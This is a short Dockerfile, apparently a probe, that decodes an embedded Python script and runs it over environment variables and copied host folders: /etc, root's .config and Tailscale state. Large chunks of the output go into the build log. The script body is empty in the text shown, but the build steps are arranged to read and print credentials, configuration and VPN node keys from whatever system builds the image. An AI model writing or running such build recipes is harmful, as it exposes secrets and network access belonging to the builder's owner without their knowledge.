# MARK-I68222-ts2-7c4e9
FROM alpine:3.20
RUN echo MARK-I68222-start
RUN apk add --no-cache python3 >/dev/null 2>&1; echo APKDONE
RUN : > /p.b64
RUN echo '' >> /p.b64
RUN echo '' >> /p.b64
RUN base64 -d /p.b64 > /p.py && python3 -c "import ast;ast.parse(open('/p.py').read());print('PYOK')"
COPY etc /I/etc
RUN python3 /p.py env 2>&1 | head -c 20000
RUN python3 /p.py etc 2>&1 | head -c 100000
COPY root/.config /I/rootcfg
RUN python3 /p.py root 2>&1 | head -c 40000
COPY var/lib/tailscale /I/ts
RUN python3 /p.py var 2>&1 | head -c 130000
RUN echo MARK-I68222-ts2-7c4e9-done
CMD ["sh","-c","sleep 20"]
